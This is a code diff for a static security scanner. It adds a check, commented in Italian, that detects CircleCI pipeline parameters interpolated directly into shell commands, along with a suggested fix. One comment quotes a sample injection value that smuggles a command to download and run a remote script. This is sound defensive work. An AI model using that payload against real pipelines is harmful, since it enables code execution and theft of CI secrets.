@@ -12,6 +12,7 @@ import {
   isTerraformFile,
   isGithubActionsWorkflow,
   isGitlabCiFile,
+  isCircleCiFile,
   nearbyMatches,
   redactLine,
 } from "../util/scan.js";
@@ -114,6 +115,22 @@ const GITLAB_DANGEROUS_VAR =
 // blocco a lista nelle righe successive, un valore non vuoto è la forma
 // inline (comando singolo o array YAML flow sulla stessa riga).
 const GITLAB_SCRIPT_KEY = /^(\s*)(?:-\s*)?(?:script|before_script|after_script):\s*(.*)$/;
+
+// A differenza di una variabile d'ambiente normale, "<< pipeline.parameters.X >>"
+// e "<< pipeline.trigger_parameters.X >>" sono sostituiti dentro lo YAML
+// PRIMA che la shell veda il comando — è un'interpolazione testuale a tempo
+// di compilazione, non una variabile che si può mettere tra virgolette per
+// proteggersi. Qualunque pipeline innescabile dall'esterno (API, webhook,
+// un altro progetto) può far arrivare un valore come `"; curl malware.sh | sh #`
+// in quel parametro, che finirebbe eseguito alla lettera nel comando.
+const CIRCLECI_PIPELINE_VALUE = /<<\s*pipeline\.(?:parameters|trigger_parameters)\.[\w.-]+\s*>>/;
+// "- run: <comando>" (forma breve) — un valore vuoto o "|"/">" indica invece
+// la forma estesa (sotto-chiavi name/command/when su righe successive), in
+// quel caso il comando vero arriva dalla chiave "command:" gestita a parte.
+const CIRCLECI_RUN_INLINE = /^\s*-\s*run:\s*(.*)$/;
+// "command:" come sotto-chiave di un passo "- run:" in forma estesa — mai
+// preceduta da un trattino, a differenza della forma breve sopra.
+const CIRCLECI_COMMAND_KEY = /^(\s*)command:\s*(.*)$/;
 
 // "pull_request_target" gira con i permessi e i segreti del repository di
 // base anche per una pull request da un fork esterno — a differenza di
@@ -1314,5 +1331,76 @@ export const criticalChecks: Check[] = [
     },
     // Nessun autofix: la riscrittura giusta dipende da cosa fa davvero lo
     // script (quale comando, quali argomenti) — non deducibile alla cieca.
+  },
+
+  {
+    id: "circleci-pipeline-parameter-injection",
+    severity: "critical",
+    confidence: "confirmed",
+    title: "Un parametro di pipeline entra direttamente in un comando shell della CI CircleCI",
+    description:
+      "Un passo \"run:\" della configurazione CircleCI usa direttamente \"<< pipeline.parameters.NOME >>\" (o \"<< pipeline.trigger_parameters.NOME >>\") dentro il comando. A differenza di una normale variabile d'ambiente, questo valore viene sostituito nello YAML PRIMA che la shell lo veda — una sostituzione testuale a tempo di compilazione, non una variabile che si può proteggere mettendola tra virgolette. Chiunque possa far partire la pipeline con parametri propri (via API, un trigger esterno, un altro progetto collegato) può far eseguire comandi arbitrari nella CI, con accesso a tutti i segreti disponibili in quel job.",
+    fix: {
+      before: `- run: ./deploy.sh << pipeline.parameters.target >>`,
+      after: `- run:\n    environment:\n      DEPLOY_TARGET: << pipeline.parameters.target >>\n    command: ./deploy.sh "$DEPLOY_TARGET"  # passato come variabile d'ambiente, mai interpolato direttamente nel comando — qui la shell può quotarlo, la sostituzione YAML no`,
+    },
+    detect(file) {
+      if (!isCircleCiFile(file)) return [];
+      const matches: CheckMatch[] = [];
+      const lines = file.content.split("\n");
+
+      function scanBlock(startIdx: number, baseIndent: number) {
+        for (let j = startIdx; j < Math.min(startIdx + 60, lines.length); j++) {
+          const next = lines[j];
+          if (next.trim() === "") continue;
+          const nextIndent = next.length - next.trimStart().length;
+          if (nextIndent <= baseIndent) break;
+          if (CIRCLECI_PIPELINE_VALUE.test(next)) {
+            matches.push({ line: j + 1, snippet: redactLine(next, 0, next.length) });
+          }
+        }
+      }
+
+      lines.forEach((lineText, idx) => {
+        const runInline = CIRCLECI_RUN_INLINE.exec(lineText);
+        if (runInline) {
+          const indent = lineText.length - lineText.trimStart().length;
+          const inline = runInline[1].trim();
+          if (inline === "") {
+            // Forma estesa ("- run:" senza nulla dopo): il comando vero
+            // arriva dalla chiave "command:" annidata, gestita sotto — qui
+            // non c'è nulla da controllare direttamente, altrimenti la
+            // stessa riga verrebbe segnalata due volte.
+            return;
+          }
+          if (/^[|>][+-]?\s*$/.test(inline)) {
+            // Forma breve multilinea ("- run: |"): il comando sono le righe
+            // seguenti più indentate, senza nessuna chiave "command:" annidata.
+            scanBlock(idx + 1, indent);
+            return;
+          }
+          if (CIRCLECI_PIPELINE_VALUE.test(inline)) {
+            matches.push({ line: idx + 1, snippet: redactLine(lineText, 0, lineText.length) });
+          }
+          return;
+        }
+
+        const cmdMatch = CIRCLECI_COMMAND_KEY.exec(lineText);
+        if (!cmdMatch) return;
+        const [, indent, inline] = cmdMatch;
+        const trimmedInline = inline.trim();
+        if (trimmedInline === "" || /^[|>][+-]?\s*$/.test(trimmedInline)) {
+          scanBlock(idx + 1, indent.length);
+          return;
+        }
+        if (CIRCLECI_PIPELINE_VALUE.test(inline)) {
+          matches.push({ line: idx + 1, snippet: redactLine(lineText, 0, lineText.length) });
+        }
+      });
+
+      return matches;
+    },
+    // Nessun autofix: come per gitlab-ci-script-injection, il nome della
+    // variabile d'ambiente giusta dipende da cosa fa davvero lo script.
   },
 ];
